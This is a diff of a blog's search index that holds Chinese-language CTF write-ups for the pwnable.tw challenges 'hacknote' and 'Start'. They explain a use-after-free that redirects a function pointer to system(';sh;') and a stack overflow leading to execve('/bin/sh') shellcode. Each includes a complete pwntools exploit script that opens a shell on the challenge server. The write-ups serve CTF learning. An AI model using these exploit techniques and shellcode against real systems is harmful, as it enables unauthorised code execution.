-<h3 id="print-note"><a href="#print-note" class="headerlink" title="print_note()"></a>print_note()</h3><p><img src="https://i.loli.net/2021/07/21/egV4iAkqnfBWpK7.png"></p>
-<p>可以看到直接调用了head堆块中的那个函数，并且参数是<code>ptr[v1]</code>，那么来看一下output函数：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">output</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们可以把a1的类型改成<code>note_struct *</code>,</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">output</span><span class="params">(note_struct *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样就很清晰了，打印data块的内容，也符合menu中的名字</p>
-<p>（所以我把这个函数名改成output，原来就是个地址</p>
-<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note()"></a>delete_note()</h3><p><img src="https://i.loli.net/2021/07/21/dxgjQNH9DUERflM.png"></p>
-<p>漏洞出现了！</p>
-<p>它在free之后没有把<code>ptr[v1]</code>清空，就会有<code>use after free (uaf)</code>漏洞</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们可以利用print_note()，它会执行head指向的那个函数，所以只要我们能把head改成system的地址，后面放上命令，就能getshell了</p>
-<p>我们先add两个note，大小随便，因为我们要打的是那个8字节的head，这里就用0x30</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#add_note(size, data)</span></span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p>于是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x9c4d048(note1_head) —▸ 0x9c4d000(note0_head) ◂— 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x9c4d058(note1_data) —▸ 0x9c4d010(note0_data) ◂— 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure>
-
-<p>如果这个时候我们add一个note2，size写0x8，</p>
-<p>note2_head就会写在note1_head，</p>
-<p>note2_data就会写在note0_head，</p>
-<blockquote>
-<p>先malloc head块，再malloc data块</p>
-</blockquote>
-<p>然后print一下note0，就能执行我们想要的东西了</p>
-<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>note2_data里写：原本output函数的地址+puts的got表地址，就能泄露libc</p>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>note2_data里写：system函数的地址+命令</p>
-<p>这里命令的写法有些麻烦，因为print_note()调用head指向的函数时，传过去的参数是<code>ptr[v1]</code>，这个指针正好指向head，head里是我们覆盖的system_addr，system_addr显然不是个可以执行的命令，</p>
-<p>所以我们得在命令里写<code>;sh;</code>，</p>
-<ul>
-<li>前一个分号：如果每个命令被一个分号 (;) 所分隔，那么命令会连续的执行下去，无论命令是否正确，<a href="https://blog.csdn.net/freedom2028/article/details/7104131">关于linux中连续命令执行</a></li>
-<li>后一个分号是无所谓的，写个<code>\0</code>也行，只是填满8个字节</li>
-<li>也可以写成<code>||sh</code>，因为<code>||</code>是执行到正确的命令才终止</li>
-</ul>
-<div class="note danger"><p>在泄露libc之后，要把note2释放掉</p>
-<p>而因为delete_note()，是先free data块，再free head块，所以note2释放后正好和之前一样</p>
-</div>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"><span class="comment"># r = process(&quot;./hacknote&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">output_addr = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">payload = p32(output_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">add_note(<span class="number">0x8</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(r.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc.address)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;;sh;&#x27;</span></span><br><span class="line">add_note(<span class="number">0x8</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/02/pwnable.tw-hacknote-writeup/">https://v1ckydxp.github.io/2019/05/02/pwnable.tw-hacknote-writeup/</a></p>
-<p><a href="http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/">http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/</a></p>
-<p><a href="https://medium.com/yuru-sec/pwnable-tw-hacknote-writeup-83129787adbb">https://medium.com/yuru-sec/pwnable-tw-hacknote-writeup-83129787adbb</a></p>
 ]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Start</title>
+    <url>/archives/5eb87a8b.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>
+
+<hr>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先checksec，得到32位程序且保护全关</p>
+<p><img src="https://i.loli.net/2021/07/10/qIBS1ro3nxzEvZY.png"></p>
+<p>扔进ida看看，程序流程很简单，输出一段话，然后请求一次输入，最多输入3c个字符</p>
+<p><img src="https://i.loli.net/2021/07/10/7tmIOrjiMQv9e5o.png"></p>
+<p>很明显的栈溢出</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以发现read的时候ecx没有变过，也就是读到<code>“Let&#39;s start the CTF:”</code>的位置，也即esp的位置，</p>
+<p>而在程序末尾看到 <code> add esp, 14h</code> ，可知padding是0x14</p>
+<p>那么思路就是在栈上布置shellcode，然后返回地址覆盖shellcode的地址</p>
+<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>我们还有<code>write</code>函数，可以先栈溢出，再调用一次<code>write</code>，就能泄露栈地址</p>
+<p>（在<code>retaddr</code>后面正好是程序开头<code>push</code>进去的栈上的地址，再调用write就会把这个地址打印出来）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了栈地址之后，直接ret2shellcode就行了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call here</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov al, 0xb</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br><span class="line">r.send(payload)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>stackoverflow</tag>
+      </tags>
   </entry>
 </search>
